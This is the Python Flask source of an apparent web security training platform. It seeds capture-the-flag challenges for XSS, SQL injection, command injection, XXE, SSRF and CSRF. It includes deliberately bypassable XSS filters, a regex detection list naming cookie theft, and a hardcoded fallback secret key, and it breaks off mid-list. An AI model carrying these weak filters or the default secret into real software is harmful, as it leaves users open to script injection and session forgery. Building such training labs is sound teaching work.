#!/usr/bin/env python3
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, make_response
from flask_sqlalchemy import SQLAlchemy
import os
import json
import random
import string
import re
import hashlib
import uuid
import sys
import argparse
import shutil
import subprocess
from datetime import datetime, timezone
import xml.etree.ElementTree as ET
import xml.parsers.expat



# Check for command-line arguments
if len(sys.argv) > 1:
    parser = argparse.ArgumentParser(description='R00tGlyph - Advanced Web Security Training Platform')
    parser.add_argument('-up', '--update', action='store_true', help='Update R00tGlyph to the latest version')
    parser.add_argument('--backup', action='store_true', help='Backup user data only')
    parser.add_argument('--restore', action='store_true', help='Restore user data from backup')
    parser.add_argument('--reset', action='store_true', help='Reset the database to its initial state')
    args = parser.parse_args()

    backup_dir = 'backup'
    db_file = 'instance/r00tglyph.db'
    backup_file = f'{backup_dir}/r00tglyph.db.bak'

    # Create backup directory if it doesn't exist
    os.makedirs(backup_dir, exist_ok=True)

    # Backup user data function
    def backup_user_data():
        if os.path.exists(db_file):
            print("Backing up user data...")
            # Create a timestamped backup
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            timestamped_backup = f'{backup_dir}/r00tglyph_{timestamp}.db.bak'

            # Copy to both timestamped and regular backup files
            shutil.copy2(db_file, timestamped_backup)
            shutil.copy2(db_file, backup_file)
            print(f"Backup created: {timestamped_backup}")
            return True
        else:
            print("No database file found to backup.")
            return False

    # Restore user data function
    def restore_user_data():
        if os.path.exists(backup_file):
            print("Restoring user data from backup...")
            if os.path.exists(db_file):
                # Create a backup of the current database before overwriting
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                pre_restore_backup = f'{backup_dir}/pre_restore_{timestamp}.db.bak'
                shutil.copy2(db_file, pre_restore_backup)
                print(f"Created pre-restore backup: {pre_restore_backup}")

            # Restore the backup
            shutil.copy2(backup_file, db_file)
            print("User data restored successfully!")
            return True
        else:
            print("No backup file found to restore.")
            return False

    # Handle backup command
    if args.backup:
        backup_user_data()
        sys.exit(0)

    # Handle restore command
    if args.restore:
        restore_user_data()
        sys.exit(0)

    # Handle reset command
    if args.reset:
        # The reset logic is now handled in the __main__ block below.
        pass

    # Handle update command
    if args.update:
        print("Updating R00tGlyph to the latest version...")

        # Step 1: Backup user data
        backup_success = backup_user_data()

        # Step 2: Pull latest changes from GitHub
        try:
            print("Pulling latest changes from GitHub...")
            subprocess.run(['git', 'pull'], check=True)
            print("Code updated successfully!")

            # Step 3: Restore user data if backup was successful
            if backup_success:
                restore_user_data()

            # Step 4: Update database schema and data
            print("Updating database schema and data...")
            with app.app_context():
                # Update SQL Injection challenges to use 'sqli' category
                challenges = Challenge.query.filter_by(category='SQL Injection').all()
                for challenge in challenges:
                    challenge.category = 'sqli'
                db.session.commit()
                print("Database schema and data updated successfully!")

            print("\nUpdate completed successfully!")
            print("Your progress and achievements have been preserved.")
            print("Restart the application to apply all changes.")

        except subprocess.CalledProcessError as e:
            print(f"Error: Failed to pull latest changes. {str(e)}")
            print("Please check your internet connection and Git configuration.")
            print("Your data has been backed up and remains unchanged.")

        sys.exit(0)

app = Flask(__name__, template_folder='templates')
app.secret_key = os.environ.get('SECRET_KEY', 'r00tglyph_secret_key_change_in_production')

# Support both SQLite (local) and PostgreSQL (production)
DATABASE_URL = os.environ.get('DATABASE_URL')
if DATABASE_URL:
    # Fix for Render/Heroku postgres:// to postgresql://
    if DATABASE_URL.startswith('postgres://'):
        DATABASE_URL = DATABASE_URL.replace('postgres://', 'postgresql://', 1)
    app.config['SQLALCHEMY_DATABASE_URI'] = DATABASE_URL
else:
    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///r00tglyph.db'

app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# Add custom Jinja filter for JSON parsing
@app.template_filter('from_json')
def from_json_filter(value):
    """Parse JSON string to Python object"""
    if value:
        try:
            return json.loads(value)
        except (json.JSONDecodeError, TypeError):
            return []
    return []

# Models
class LocalUser(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(50), nullable=False, default='Hacker')
    display_name = db.Column(db.String(50), nullable=False, default='Anonymous Hacker')
    machine_id = db.Column(db.String(64), unique=True, nullable=False)
    score = db.Column(db.Integer, default=0)
    completed_challenges = db.Column(db.Text, default='[]')  # JSON string of completed challenge IDs
    created_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
    last_active = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))

class Challenge(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    name = db.Column(db.String(100), nullable=False)
    category = db.Column(db.String(50), nullable=False)  # 'xss', 'sqli', etc.
    difficulty = db.Column(db.String(20), nullable=False)  # 'beginner', 'intermediate', 'advanced'
    description = db.Column(db.Text, nullable=False)
    points = db.Column(db.Integer, default=100)
    active = db.Column(db.Boolean, default=True)

class Flag(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    challenge_id = db.Column(db.Integer, db.ForeignKey('challenge.id'), nullable=False)
    machine_id = db.Column(db.String(64), nullable=False)
    flag_value = db.Column(db.String(100), nullable=False)
    used = db.Column(db.Boolean, default=False)
    created_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))

class Submission(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    machine_id = db.Column(db.String(64), nullable=False)
    challenge_id = db.Column(db.Integer, db.ForeignKey('challenge.id'), nullable=False)
    flag = db.Column(db.String(100), nullable=False)
    correct = db.Column(db.Boolean, default=False)
    timestamp = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))

class Comment(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(50))
    content = db.Column(db.Text)
    level = db.Column(db.Integer)
    machine_id = db.Column(db.String(64), nullable=True)  # Optional, to track who posted the comment
    timestamp = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))

# Create database tables
with app.app_context():
    db.create_all()

# Define reset_database function
def reset_database():
    """Reset the database to its initial state"""
    print("Dropping all tables...")
    with app.app_context():
        db.drop_all()
        print("Creating all tables...")
        db.create_all()
        print("Initializing database...")
        # Initialize challenges
        challenges = [
            Challenge(name="Basic Reflected XSS", category="xss", difficulty="beginner",
                     description="Find and exploit a basic reflected XSS vulnerability.", points=100),
            Challenge(name="DOM-based XSS", category="xss", difficulty="beginner",
                     description="Exploit a DOM-based XSS vulnerability.", points=200),
            Challenge(name="Stored XSS", category="xss", difficulty="intermediate",
                     description="Find and exploit a stored XSS vulnerability.", points=300),
            Challenge(name="XSS with Basic Filters", category="xss", difficulty="intermediate",
                     description="Bypass basic XSS filters.", points=400),
            Challenge(name="XSS with Advanced Filters", category="xss", difficulty="advanced",
                     description="Bypass advanced XSS filters.", points=500),
            Challenge(name="XSS with ModSecurity WAF", category="xss", difficulty="advanced",
                     description="Bypass ModSecurity WAF rules.", points=600),
            Challenge(name="XSS via HTTP Headers", category="xss", difficulty="advanced",
                     description="Exploit XSS via HTTP headers.", points=700),
            Challenge(name="XSS in JSON API", category="xss", difficulty="advanced",
                     description="Exploit XSS in a JSON API.", points=750),
            Challenge(name="XSS with CSP Bypass", category="xss", difficulty="expert",
                     description="Bypass Content Security Policy protections.", points=800),
            Challenge(name="XSS with Mutation Observer Bypass", category="xss", difficulty="expert",
                     description="Bypass DOM sanitization with Mutation Observers.", points=900),
            Challenge(name="XSS via SVG and CDATA", category="xss", difficulty="expert",
                     description="Exploit SVG features to execute JavaScript.", points=1000),
            Challenge(name="Blind XSS with Webhook Exfiltration", category="xss", difficulty="expert",
                     description="Exploit a blind XSS vulnerability and exfiltrate data.", points=1100),
            Challenge(name="XSS in PDF Generation", category="xss", difficulty="expert",
                     description="Exploit an XSS vulnerability in PDF generation.", points=1200),
            Challenge(name="XSS via Prototype Pollution", category="xss", difficulty="expert",
                     description="Exploit prototype pollution to achieve XSS.", points=1300),
            Challenge(name="XSS via Template Injection", category="xss", difficulty="expert",
                     description="Exploit template injection to achieve XSS.", points=1400),
            Challenge(name="XSS in WebAssembly Applications", category="xss", difficulty="expert",
                     description="Exploit XSS vulnerabilities in WebAssembly applications.", points=1500),
            Challenge(name="XSS in Progressive Web Apps", category="xss", difficulty="expert",
                     description="Exploit XSS vulnerabilities in Progressive Web Apps.", points=1600),
            Challenge(name="XSS via Web Components", category="xss", difficulty="expert",
                     description="Exploit XSS vulnerabilities in Web Components and Shadow DOM.", points=1700),
            Challenge(name="XSS in GraphQL APIs", category="xss", difficulty="expert",
                     description="Exploit XSS vulnerabilities in GraphQL API responses.", points=1800),
            Challenge(name="XSS in WebRTC Applications", category="xss", difficulty="expert",
                     description="Exploit XSS vulnerabilities in WebRTC applications.", points=1900),
            Challenge(name="XSS via Web Bluetooth/USB", category="xss", difficulty="expert",
                     description="Exploit XSS vulnerabilities in Web Bluetooth/USB APIs.", points=2000),
            Challenge(name="XSS in WebGPU Applications", category="xss", difficulty="expert",
                     description="Exploit XSS vulnerabilities in WebGPU applications.", points=2100),
            Challenge(name="XSS in Federated Identity Systems", category="xss", difficulty="expert",
                     description="Exploit XSS vulnerabilities in federated identity systems.", points=2200),

            # SQL Injection Challenges
            Challenge(name="Basic SQL Injection", category="sqli", difficulty="beginner",
                     description="Find and exploit a basic SQL injection vulnerability.", points=100),
            Challenge(name="SQL Injection in Search", category="sqli", difficulty="beginner",
                     description="Exploit SQL injection in search functionality.", points=200),
            Challenge(name="SQL Injection with UNION", category="sqli", difficulty="intermediate",
                     description="Use UNION-based SQL injection techniques.", points=300),
            Challenge(name="Blind SQL Injection", category="sqli", difficulty="intermediate",
                     description="Exploit blind SQL injection vulnerabilities.", points=400),
            Challenge(name="Time-Based Blind SQL Injection", category="sqli", difficulty="intermediate",
                     description="Use time-based techniques for blind SQL injection.", points=500),
            Challenge(name="SQL Injection with WAF Bypass", category="sqli", difficulty="advanced",
                     description="Bypass WAF protection to exploit SQL injection.", points=600),
            Challenge(name="Error-Based SQL Injection", category="sqli", difficulty="advanced",
                     description="Extract data using error-based SQL injection.", points=700),
            Challenge(name="Second-Order SQL Injection", category="sqli", difficulty="advanced",
                     description="Exploit second-order SQL injection vulnerabilities.", points=800),
            Challenge(name="SQL Injection in REST API", category="sqli", difficulty="advanced",
                     description="Find SQL injection in REST API endpoints.", points=900),
            Challenge(name="NoSQL Injection", category="sqli", difficulty="expert",
                     description="Exploit NoSQL injection vulnerabilities.", points=1000),
            Challenge(name="GraphQL Injection", category="sqli", difficulty="expert",
                     description="Exploit SQL injection in GraphQL queries.", points=1100),
            Challenge(name="ORM-based SQL Injection", category="sqli", difficulty="expert",
                     description="Exploit SQL injection in ORM frameworks.", points=1200),
            Challenge(name="Out-of-band SQL Injection", category="sqli", difficulty="expert",
                     description="Use out-of-band techniques for data exfiltration.", points=1300),
            Challenge(name="SQL Injection with Advanced WAF Bypass", category="sqli", difficulty="expert",
                     description="Advanced WAF bypass techniques for SQL injection.", points=1400),
            Challenge(name="SQL Injection via XML", category="sqli", difficulty="expert",
                     description="Exploit SQL injection through XML processing.", points=1500),
            Challenge(name="SQL Injection in WebSockets", category="sqli", difficulty="expert",
                     description="Find SQL injection in WebSocket connections.", points=1600),
            Challenge(name="SQL Injection in Mobile App Backend", category="sqli", difficulty="expert",
                     description="Exploit SQL injection in mobile app backends.", points=1700),
            Challenge(name="SQL Injection in Cloud Functions", category="sqli", difficulty="expert",
                     description="Find SQL injection in serverless cloud functions.", points=1800),
            Challenge(name="SQL Injection via File Upload", category="sqli", difficulty="expert",
                     description="Exploit SQL injection through file upload functionality.", points=1900),
            Challenge(name="SQL Injection in Stored Procedures", category="sqli", difficulty="expert",
                     description="Exploit SQL injection in stored procedures.", points=2000),
            Challenge(name="SQL Injection in GraphQL API", category="sqli", difficulty="expert",
                     description="Advanced GraphQL injection techniques.", points=2100),
            Challenge(name="SQL Injection in NoSQL Database", category="sqli", difficulty="expert",
                     description="Exploit injection vulnerabilities in NoSQL databases.", points=2200),
            Challenge(name="SQL Injection in ORM Layer", category="sqli", difficulty="expert",
                     description="Advanced ORM injection and bypass techniques.", points=2300),

            # Command Injection Challenges
            Challenge(name="Basic Command Injection", category="cmdi", difficulty="beginner",
                     description="Find and exploit a basic command injection vulnerability.", points=100),
            Challenge(name="Command Injection with Filters", category="cmdi", difficulty="beginner",
                     description="Bypass basic command injection filters.", points=200),
            Challenge(name="Blind Command Injection", category="cmdi", difficulty="intermediate",
                     description="Exploit a blind command injection vulnerability.", points=300),
            Challenge(name="Command Injection via File Upload", category="cmdi", difficulty="intermediate",
                     description="Exploit command injection through file upload functionality.", points=400),
            Challenge(name="Command Injection in API Parameters", category="cmdi", difficulty="intermediate",
                     description="Find command injection in API parameters.", points=500),
            Challenge(name="Command Injection with WAF Bypass", category="cmdi", difficulty="advanced",
                     description="Bypass WAF protection to exploit command injection.", points=600),
            Challenge(name="Time-Based Blind Command Injection", category="cmdi", difficulty="advanced",
                     description="Exploit time-based blind command injection.", points=700),
            Challenge(name="Command Injection in Log Processing", category="cmdi", difficulty="advanced",
                     description="Exploit command injection in log processing systems.", points=800),
            Challenge(name="Command Injection in JSON APIs", category="cmdi", difficulty="advanced",
                     description="Find command injection vulnerabilities in JSON APIs.", points=900),
            Challenge(name="Command Injection in XML Processing", category="cmdi", difficulty="advanced",
                     description="Exploit command injection in XML processing.", points=1000),
            Challenge(name="Advanced Command Injection WAF Bypass", category="cmdi", difficulty="expert",
                     description="Advanced WAF bypass techniques for command injection.", points=1100),
            Challenge(name="Command Injection in DevOps Tools", category="cmdi", difficulty="expert",
                     description="Exploit command injection in DevOps automation tools.", points=1200),
            Challenge(name="Command Injection in GraphQL APIs", category="cmdi", difficulty="expert",
                     description="Find command injection in GraphQL API implementations.", points=1300),
            Challenge(name="Command Injection in WebSocket Connections", category="cmdi", difficulty="expert",
                     description="Exploit command injection through WebSocket connections.", points=1400),
            Challenge(name="Command Injection in Serverless Functions", category="cmdi", difficulty="expert",
                     description="Exploit command injection in serverless function environments.", points=1500),
            Challenge(name="Advanced Shell Features Command Injection", category="cmdi", difficulty="expert",
                     description="Exploit advanced shell features for command injection.", points=1600),
            Challenge(name="Command Injection in Container Environments", category="cmdi", difficulty="expert",
                     description="Exploit command injection in containerized applications.", points=1700),
            Challenge(name="Command Injection via Template Engines", category="cmdi", difficulty="expert",
                     description="Exploit command injection through template engines.", points=1800),
            Challenge(name="Command Injection in Message Queues", category="cmdi", difficulty="expert",
                     description="Find command injection in message queue systems.", points=1900),
            Challenge(name="Out-of-Band Command Injection", category="cmdi", difficulty="expert",
                     description="Exploit out-of-band command injection techniques.", points=2000),
            Challenge(name="Command Injection in Cloud Functions", category="cmdi", difficulty="expert",
                     description="Exploit command injection in cloud function platforms.", points=2100),
            Challenge(name="Command Injection in SSH Commands", category="cmdi", difficulty="expert",
                     description="Exploit command injection in SSH command execution.", points=2200),
            Challenge(name="Advanced Command Injection Chaining", category="cmdi", difficulty="expert",
                     description="Chain multiple command injection techniques for maximum impact.", points=2300),

            # XML External Entity (XXE) Injection Challenges
            Challenge(name="Basic XXE File Disclosure", category="xxe", difficulty="beginner",
                     description="Exploit a basic XXE vulnerability to read local files.", points=100),
            Challenge(name="XXE with DOCTYPE Restrictions", category="xxe", difficulty="beginner",
                     description="Bypass basic DOCTYPE restrictions in XXE attacks.", points=200),
            Challenge(name="XXE SYSTEM Entity Exploitation", category="xxe", difficulty="beginner",
                     description="Use SYSTEM entities to access forbidden files.", points=300),
            Challenge(name="XXE Internal Network Scanning", category="xxe", difficulty="intermediate",
                     description="Use XXE to scan internal network services.", points=400),
            Challenge(name="XXE Data Exfiltration via HTTP", category="xxe", difficulty="intermediate",
                     description="Exfiltrate sensitive data using HTTP-based XXE.", points=500),
            Challenge(name="XXE with Parameter Entities", category="xxe", difficulty="intermediate",
                     description="Exploit XXE using parameter entities for advanced attacks.", points=600),
            Challenge(name="Blind XXE via Error Messages", category="xxe", difficulty="intermediate",
                     description="Exploit blind XXE vulnerabilities through error-based techniques.", points=700),
            Challenge(name="XXE with CDATA Injection", category="xxe", difficulty="intermediate",
                     description="Use CDATA sections to bypass XXE filters.", points=800),
            Challenge(name="XXE via SVG File Upload", category="xxe", difficulty="advanced",
                     description="Exploit XXE through malicious SVG file uploads.", points=900),
            Challenge(name="XXE with XInclude Attacks", category="xxe", difficulty="advanced",
                     description="Perform XXE attacks using XInclude directives.", points=1000),
            Challenge(name="XXE Billion Laughs DoS", category="xxe", difficulty="advanced",
                     description="Perform denial of service attacks through entity expansion.", points=1100),
            Challenge(name="XXE SSRF Combination Attack", category="xxe", difficulty="advanced",
                     description="Combine XXE with SSRF for advanced exploitation.", points=1200),
            Challenge(name="XXE with WAF Bypass Techniques", category="xxe", difficulty="advanced",
                     description="Bypass Web Application Firewalls to exploit XXE.", points=1300),
            Challenge(name="XXE via SOAP Web Services", category="xxe", difficulty="expert",
                     description="Exploit XXE vulnerabilities in SOAP-based web services.", points=1400),
            Challenge(name="Advanced XXE with OOB Data Retrieval", category="xxe", difficulty="expert",
                     description="Use out-of-band techniques for XXE data exfiltration.", points=1500),
            Challenge(name="XXE in JSON-XML Conversion", category="xxe", difficulty="expert",
                     description="Exploit XXE in applications that convert JSON to XML.", points=1600),
            Challenge(name="XXE with Custom Entity Resolvers", category="xxe", difficulty="expert",
                     description="Bypass custom entity resolvers and security controls.", points=1700),
            Challenge(name="XXE in Microsoft Office Documents", category="xxe", difficulty="expert",
                     description="Exploit XXE vulnerabilities in Office document processing.", points=1800),
            Challenge(name="XXE with Protocol Handler Exploitation", category="xxe", difficulty="expert",
                     description="Exploit various protocol handlers through XXE attacks.", points=1900),
            Challenge(name="XXE in XML Signature Verification", category="xxe", difficulty="expert",
                     description="Exploit XXE in XML digital signature verification processes.", points=2000),
            Challenge(name="XXE with Time-Based Blind Techniques", category="xxe", difficulty="expert",
                     description="Use time-based techniques for blind XXE exploitation.", points=2100),
            Challenge(name="XXE in Cloud XML Processing", category="xxe", difficulty="expert",
                     description="Exploit XXE vulnerabilities in cloud-based XML processing services.", points=2200),
            Challenge(name="Advanced XXE Attack Chaining", category="xxe", difficulty="expert",
                     description="Chain multiple XXE techniques for maximum exploitation impact.", points=2300),

            # Server-Side Request Forgery (SSRF) Challenges
            Challenge(name="Basic SSRF", category="ssrf", difficulty="beginner",
                     description="Find and exploit a basic SSRF vulnerability.", points=100),
            Challenge(name="SSRF with Internal Network Scanning", category="ssrf", difficulty="beginner",
                     description="Use SSRF to scan internal network services.", points=200),
            Challenge(name="Cloud Metadata SSRF", category="ssrf", difficulty="intermediate",
                     description="Exploit SSRF to access cloud metadata services.", points=300),
            Challenge(name="Blind SSRF with DNS Exfiltration", category="ssrf", difficulty="intermediate",
                     description="Exploit blind SSRF using DNS exfiltration techniques.", points=400),
            Challenge(name="SSRF with Basic Filters", category="ssrf", difficulty="intermediate",
                     description="Bypass basic SSRF protection filters.", points=500),
            Challenge(name="SSRF via File Upload", category="ssrf", difficulty="advanced",
                     description="Exploit SSRF through image processing vulnerabilities.", points=600),
            Challenge(name="SSRF in Webhooks", category="ssrf", difficulty="advanced",
                     description="Exploit SSRF in webhook URL validation.", points=700),
            Challenge(name="SSRF with WAF Bypass", category="ssrf", difficulty="advanced",
                     description="Bypass WAF protection to exploit SSRF.", points=800),
            Challenge(name="SSRF via XXE", category="ssrf", difficulty="expert",
                     description="Chain XXE with SSRF for internal network access.", points=900),
            Challenge(name="SSRF with DNS Rebinding", category="ssrf", difficulty="expert",
                     description="Use DNS rebinding attacks to bypass SSRF protections.", points=1000),
            Challenge(name="SSRF in GraphQL", category="ssrf", difficulty="expert",
                     description="Exploit SSRF vulnerabilities in GraphQL introspection.", points=1100),
            Challenge(name="SSRF via Redis Protocol", category="ssrf", difficulty="expert",
                     description="Use Gopher protocol to exploit Redis via SSRF.", points=1200),
            Challenge(name="SSRF in WebSocket Upgrade", category="ssrf", difficulty="expert",
                     description="Exploit SSRF during WebSocket connection upgrades.", points=1300),
            Challenge(name="SSRF via SMTP Protocol", category="ssrf", difficulty="expert",
                     description="Use SSRF to interact with internal SMTP servers.", points=1400),
            Challenge(name="SSRF in OAuth Callbacks", category="ssrf", difficulty="expert",
                     description="Exploit SSRF in OAuth redirect URI validation.", points=1500),
            Challenge(name="SSRF via LDAP Protocol", category="ssrf", difficulty="expert",
                     description="Use SSRF to query internal LDAP directories.", points=1600),
            Challenge(name="SSRF in Container Metadata", category="ssrf", difficulty="expert",
                     description="Access Docker/Kubernetes metadata via SSRF.", points=1700),
            Challenge(name="SSRF via FTP Protocol", category="ssrf", difficulty="expert",
                     description="Exploit internal FTP services through SSRF.", points=1800),
            Challenge(name="SSRF in API Gateway", category="ssrf", difficulty="expert",
                     description="Exploit SSRF in API gateway configurations.", points=1900),
            Challenge(name="SSRF via Time-based Attacks", category="ssrf", difficulty="expert",
                     description="Use timing attacks for blind SSRF exploitation.", points=2000),
            Challenge(name="SSRF in Microservices", category="ssrf", difficulty="expert",
                     description="Exploit SSRF in microservice architectures.", points=2100),
            Challenge(name="SSRF via Protocol Smuggling", category="ssrf", difficulty="expert",
                     description="Use protocol smuggling for advanced SSRF.", points=2200),
            Challenge(name="SSRF in Serverless Functions", category="ssrf", difficulty="expert",
                     description="Exploit SSRF in serverless computing environments.", points=2300),

            # Cross-Site Request Forgery (CSRF) Challenges
            Challenge(name="Basic Form CSRF", category="csrf", difficulty="beginner",
                     description="Exploit a basic CSRF vulnerability in form submissions.", points=100),
            Challenge(name="GET-based CSRF", category="csrf", difficulty="beginner",
                     description="Exploit CSRF in state-changing GET requests.", points=200),
            Challenge(name="JSON CSRF", category="csrf", difficulty="intermediate",
                     description="Perform CSRF attacks with JSON payloads.", points=300),
            Challenge(name="File Upload CSRF", category="csrf", difficulty="intermediate",
                     description="Exploit CSRF in file upload functionality.", points=400),
            Challenge(name="CSRF with Weak Tokens", category="csrf", difficulty="intermediate",
                     description="Bypass weak CSRF token implementations.", points=500),
            Challenge(name="Referrer-based Protection Bypass", category="csrf", difficulty="intermediate",
                     description="Bypass referrer header validation in CSRF protection.", points=600),
            Challenge(name="CSRF in AJAX Requests", category="csrf", difficulty="intermediate",
                     description="Exploit CSRF in XMLHttpRequest and fetch API calls.", points=700),
            Challenge(name="SameSite Cookie Bypass", category="csrf", difficulty="advanced",
                     description="Bypass SameSite cookie protection mechanisms.", points=800),
            Challenge(name="CSRF with Custom Headers", category="csrf", difficulty="advanced",
                     description="Bypass custom header-based CSRF protection.", points=900),
            Challenge(name="Multi-step CSRF", category="csrf", difficulty="advanced",
                     description="Execute complex multi-step CSRF attack chains.", points=1000),
            Challenge(name="CSRF in Password Change", category="csrf", difficulty="advanced",
                     description="Exploit CSRF in critical password change functionality.", points=1100),
            Challenge(name="CSRF with CAPTCHA Bypass", category="csrf", difficulty="advanced",
                     description="Bypass CAPTCHA protection in CSRF attacks.", points=1200),
            Challenge(name="CSRF with CORS Exploitation", category="csrf", difficulty="expert",
                     description="Combine CSRF with CORS misconfigurations.", points=1300),
            Challenge(name="WebSocket CSRF", category="csrf", difficulty="expert",
                     description="Exploit CSRF vulnerabilities in WebSocket connections.", points=1400),
            Challenge(name="CSRF in OAuth Flows", category="csrf", difficulty="expert",
                     description="Exploit CSRF in OAuth authorization flows.", points=1500),
            Challenge(name="CSRF with CSP Bypass", category="csrf", difficulty="expert",
                     description="Bypass Content Security Policy in CSRF attacks.", points=1600),
            Challenge(name="CSRF via XSS Chain", category="csrf", difficulty="expert",
                     description="Chain XSS and CSRF for advanced exploitation.", points=1700),
            Challenge(name="GraphQL CSRF", category="csrf", difficulty="expert",
                     description="Exploit CSRF vulnerabilities in GraphQL APIs.", points=1800),
            Challenge(name="JWT-based CSRF", category="csrf", difficulty="expert",
                     description="Exploit CSRF with JWT token manipulation.", points=1900),
            Challenge(name="Mobile API CSRF", category="csrf", difficulty="expert",
                     description="Exploit CSRF in mobile application APIs.", points=2000),
            Challenge(name="Microservices CSRF", category="csrf", difficulty="expert",
                     description="Exploit CSRF in microservices architectures.", points=2100),
            Challenge(name="CSRF with Subdomain Takeover", category="csrf", difficulty="expert",
                     description="Combine subdomain takeover with CSRF exploitation.", points=2200),
            Challenge(name="Serverless Function CSRF", category="csrf", difficulty="expert",
                     description="Exploit CSRF in serverless computing environments.", points=2300),
        ]
        db.session.add_all(challenges)
        db.session.commit()
        print("Database reset complete!")



# Helper functions
def get_machine_id():
    """Generate or retrieve a unique machine identifier"""
    if 'machine_id' not in session:
        # Generate a new machine ID if not in session
        session['machine_id'] = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()

        # Check if this machine ID exists in the database
        existing_user = LocalUser.query.filter_by(machine_id=session['machine_id']).first()
        if not existing_user:
            # Create a new local user
            new_user = LocalUser(
                username='Hacker',
                display_name='Anonymous Hacker',
                machine_id=session['machine_id']
            )
            db.session.add(new_user)
            db.session.commit()

    return session['machine_id']

def get_local_user():
    """Get the current local user or create one if it doesn't exist"""
    machine_id = get_machine_id()
    user = LocalUser.query.filter_by(machine_id=machine_id).first()

    if not user:
        # Create a new local user if not found
        user = LocalUser(
            username='Hacker',
            display_name='Anonymous Hacker',
            machine_id=machine_id
        )
        db.session.add(user)
        db.session.commit()

    # Update last active time
    user.last_active = datetime.now(timezone.utc)
    db.session.commit()

    return user

def generate_flag(challenge_id, machine_id):
    """Generate a unique flag for a specific challenge and machine"""
    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
    unique_id = f"{challenge_id}_{machine_id}_{random_part}"
    flag = f"R00T{{{hashlib.md5(unique_id.encode()).hexdigest()}}}"
    return flag

def get_or_create_flag(challenge_id, machine_id):
    """Get an existing unused flag or create a new one"""
    # Check for existing unused flag
    existing_flag = Flag.query.filter_by(
        challenge_id=challenge_id,
        machine_id=machine_id,
        used=False
    ).first()

    if existing_flag:
        return existing_flag.flag_value

    # Create new flag
    new_flag_value = generate_flag(challenge_id, machine_id)
    new_flag = Flag(challenge_id=challenge_id, machine_id=machine_id, flag_value=new_flag_value)
    db.session.add(new_flag)
    db.session.commit()

    return new_flag_value

def update_user_progress(machine_id, challenge_id, points):
    """Update user progress after completing a challenge"""
    user = LocalUser.query.filter_by(machine_id=machine_id).first()
    if user:
        # Update completed challenges
        completed = json.loads(user.completed_challenges) if user.completed_challenges else []
        if challenge_id not in completed:
            # Only award points if challenge wasn't already completed
            user.score += points
            completed.append(challenge_id)
            user.completed_challenges = json.dumps(completed)
            db.session.commit()
            return True
        else:
            # Challenge already completed, no points awarded
            return False
    return False

# WAF emulation functions
class WAF:
    @staticmethod
    def basic_filter(input_str):
        """Remove basic XSS vectors"""
        if input_str:
            return input_str.replace('<script>', '').replace('</script>', '')
        return input_str

    @staticmethod
    def advanced_filter(input_str):
        """More advanced filtering"""
        if not input_str:
            return input_str

        filtered = input_str.lower()
        filtered = filtered.replace('javascript:', '')
        filtered = filtered.replace('onerror', '')
        filtered = filtered.replace('onload', '')
        filtered = filtered.replace('<script', '')
        filtered = filtered.replace('</script', '')
        return filtered

    @staticmethod
    def modsecurity_emulation(input_str):
        """Emulate ModSecurity WAF rules"""
        if not input_str:
            return input_str, False

        # Common XSS patterns
        xss_patterns = [
            r'<script[^>]*>[\s\S]*?<\/script>',
            r'javascript\s*:',
            r'on\w+\s*=',
            r'\beval\s*\(',
            r'document\.cookie',
            r'document\.location',
            r'document\.write',
            r'\balert\s*\(',
            r'\bprompt\s*\(',
            r'\bconfirm\s*\(',
            r'<img[^>]*\bon\w+\s*=',
            r'<iframe[^>]*>',
            r'<svg[^>]*>',
            r'<body[^>]*\bon\w+\s*=',
            r'<details[^>]*\bon\w+\s*=',
            r'\bfunction\s*\(',
            r'\breturn\s*\(',
            r'\bsetTimeout\s*\(',
            r'\bsetInterval\s*\(',
            r'\bnew\s+Function',
            r'\bObject\s*\(',
            r'\bArray\s*\(',
            r'\bString\s*\(',
            r'\bNumber\s*\(',
            r'\bBoolean\s*\(',
            r'\bRegExp\s*\(',
            r'\bDate\s*\(',
            r'\bMath\s*\.',
            r'\bJSON\s*\.',
            r'\bwindow\s*\.',
            r'\bdocument\s*\.',
            r'\blocation\s*\.',
            r'\bnavigator\s*\.',
            r'\bhistory\s*\.',
            r'\bscreen\s*\.',
            r'\bparent\s*\.',
            r'\btop\s*\.',
            r'\bself\s*\.',
            r'\bglobal\s*\.',
            r'\bthis\s*\.',
            r'\bprototype\s*\.',
            r'\b__proto__\s*\.',
            r'\bconstructor\s*\.',
            r'\bbase64\s*\(',
            r'\batob\s*\(',
            r'\bbtoa\s*\(',
            r'\bunescape\s*\(',
            r'\bescape\s*\(',
            r'\bdecodeURI\s*\(',
            r'\bencodeURI\s*\(',
            r'\bdecodeURIComponent\s*\(',
            r'\bencodeURIComponent\s*\(',
            r'\bcharAt\s*\(',
            r'\bcharCodeAt\s*\(',
            r'\bfromCharCode\s*\(',
            r'\bsubstr\s*\(',
            r'\bsubstring\s*\(',
            r'\bslice\s*\(',
            r'\breplace\s*\(',
            r'\bmatch\s*\(',
            r'\bsearch\s*\(',
            r'\bsplit\s*\(',
            r'\bjoin\s*\(',
            r'\bconcat\s*\(',
            r'\bindexOf\s*\(',
            r'\blastIndexOf\s*\(',
            r'\bpush\s*\(',
            r'\bpop\s*\(',
            r'\bshift\s*\(',
            r'\bunshift\s*\(',
            r'\bsplice\s*\(',
            r'\bsort\s*\(',
            r'\breverse\s*\(',
            r'\bmap\s*\(',
            r'\bfilter\s*\(',
            r'\breduce\s*\(',
            r'\bforEach\s*\(',
            r'\bsome\s*\(',
            r'\bevery\s*\(',
            r'\bfind\s*\(',
            r'\bfindIndex\s*\(',
            r'\bincludes\s*\(',
            r'\bkeys\s*\(',
            r'\bvalues\s*\(',
            r'\bentries\s*\(',
